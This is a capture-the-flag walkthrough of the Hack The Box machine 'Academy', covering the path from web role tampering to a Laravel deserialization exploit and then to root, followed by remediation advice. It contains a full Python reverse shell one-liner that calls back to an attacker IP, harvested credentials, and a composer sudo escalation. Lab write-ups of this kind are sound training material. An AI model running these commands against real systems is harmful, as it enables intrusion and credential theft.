# Academy

```
root@kali:/home/kali/htb/Academy# nmap -p- -sV -sC 10.129.119.7
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-23 20:27 EDT
Nmap scan report for academy.htb (10.129.119.7)
Host is up (0.032s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Hack The Box Academy
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=3/23%Time=605A8779%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.90 seconds
```

The web-server immediately redirects to academy.htb

So I add that to my /etc/hosts file.

Going to the website allows for registration and login.

I log in but I can't really click anything.

I try to register another account called admin, which works.

But when I log in I get the same responses. Our user is always named egre55.

I throw up burpsuite to see what's going on when we register.

And I see that the request looks like `uid=user&password=user&confirm=user&roleid=0`

I open up a new firefox window in private mode to reset my cookies and session, and send the register.php request to the repeater.

I change the PHPSESSID to the one from my new window, and the payload to:

`uid=adm&password=adm&confirm=adm&roleid=1`

I then log in via admin.php.

```
Academy Launch Planner
Item 	Status
Complete initial set of modules (cry0l1t3 / mrb3n) 	done
Finalize website design 	done
Test all modules 	done
Prepare launch campaign 	done
Separate student and admin roles 	done
Fix issue with dev-staging-01.academy.htb 	pending
```

So we have to add this subdomain here.

Going into the subdomain I get a fair bit of information.

```
APP_NAME 	"Laravel"
APP_ENV 	"local"
APP_KEY 	"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
DB_HOST 	"127.0.0.1"
DB_PORT 	"3306"
DB_DATABASE 	"homestead"
DB_USERNAME 	"homestead"
DB_PASSWORD 	"secret"

```

I check for some laravel exploits:

```
root@kali:/home/kali/htb/Academy# searchsploit laravel
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Laravel - 'Hash::make()' Password Truncation Security                              | multiple/remote/39318.txt
Laravel Log Viewer < 0.13.0 - Local File Download                                  | php/webapps/44343.py
PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command E | linux/remote/47129.rb
UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                          | php/webapps/48166.txt
UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload                 | php/webapps/46389.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/Academy# 
```

The PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution seems good. But it's a metasploit script.

I find a python one at https://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py


```
root@kali:/home/kali/htb/Academy# python3 pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive

Linux academy 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

 Running in interactive mode. Press CTRL+C to exit.
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.51",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

```


I use the above command to get a better shell on my netcat listener:

```
root@kali:/home/kali/htb/Academy# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.119.7 58516
www-data@academy:/var/www/html/htb-academy-dev-01/public$ 
```

We have quite a number of home users:

```
www-data@academy:/home$ ls -la
ls -la
total 32
drwxr-xr-x  8 root     root     4096 Aug 10  2020 .
drwxr-xr-x 20 root     root     4096 Feb 10 13:12 ..
drwxr-xr-x  2 21y4d    21y4d    4096 Aug 10  2020 21y4d
drwxr-xr-x  2 ch4p     ch4p     4096 Aug 10  2020 ch4p
drwxr-xr-x  4 cry0l1t3 cry0l1t3 4096 Aug 12  2020 cry0l1t3
drwxr-xr-x  3 egre55   egre55   4096 Aug 10  2020 egre55
drwxr-xr-x  2 g0blin   g0blin   4096 Aug 10  2020 g0blin
drwxr-xr-x  5 mrb3n    mrb3n    4096 Aug 12  2020 mrb3n
www-data@academy:/home$ 

```

I upload linpeas.sh and the it discovers a plethora of database creds.

Eventually this one:

```
www-data@academy:/var/www/html/htb-academy-dev-01$ cat /var/www/html/academy/.env
</htb-academy-dev-01$ cat /var/www/html/academy/.env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
www-data@academy:/var/www/html/htb-academy-dev-01$ 
```

and mySup3rP4s5w0rd!! this password works on user cry0l1t3


```
www-data@academy:/var/www/html/htb-academy-dev-01$ su -l cry0l1t3
su -l cry0l1t3
Password: mySup3rP4s5w0rd!!

$ whoami
whoami
cry0l1t3
$ id
id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
cry0l1t3@academy:~$
```

I rerun linpeas and see this:

```
[+] Checking for TTY (sudo/su) passwords in logs
Error opening config file (Permission denied)                                                                                                                                          
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A

[...]
[...]
[...]

cry0l1t3@academy:/tmp$ which xxd
which xxd
/usr/bin/xxd
cry0l1t3@academy:/tmp$ echo "6D7262336E5F41634064336D79210A" | xxd -r -p
echo "6D7262336E5F41634064336D79210A" | xxd -r -p
mrb3n_Ac@d3my!
cry0l1t3@academy:/tmp$ su mrb3n
su mrb3n
Password: mrb3n_Ac@d3my!

$ id
id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
mrb3n@academy:/tmp$
mrb3n@academy:/tmp$ sudo -l
sudo -l
[sudo] password for mrb3n: mrb3n_Ac@d3my!

Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
mrb3n@academy:/tmp$ 
```

xxd -r means convert hex to ascii, -p means plain format.

We get a binary with sudo rights. That means we head straight over to GTFObins. https://gtfobins.github.io/gtfobins/composer/

```
mrb3n@academy:/tmp$ TF=$(mktemp -d)
TF=$(mktemp -d)
mrb3n@academy:/tmp$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
<":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:/tmp$ sudo composer --working-dir=$TF run-script x
sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
whoami
root
# 
```


## Comparing myself with the official writeup:

They use dirsearch to enumerate and find the admin.php page.

After finding out that nothing happens on the page, they use burpsuite to change the role parameter to gain admin access.

They find the subdomain and head over there.

They find the laravel exploit and get a shell. They get a tty shell with `python3 -c 'import pty;pty.spawn("/bin/bash");'`

They go to the .env laravel mysql instance and find the password for user cry0l1t3

They see that the user is a member of the admin group and head over to the logs.

they google linux audit logs and find out that if logging of tty input is enabled, any inpout including passwords are stored hex-encoded instide the audit logs.

they use aureport to query the tty logs.

They get mrb3n's password and find the composer gtfobin to get root.


## How to stop this exploit:

Having the registration send the role id is like letting users register as admins. Horrible idea.

Furthermore Laravel should be updated to the latest version. To patch the token unserialize exploit.

Passwords should not be reused, here user cry0l1t3 reused the password on the mysql database for laravel.

allowing audit.logs to log the tty will give a better overview of what is happening. But it does also give out the information to anyone who can read the logs.

And finally, composer even tells you to never run it as root. Terrible idea.
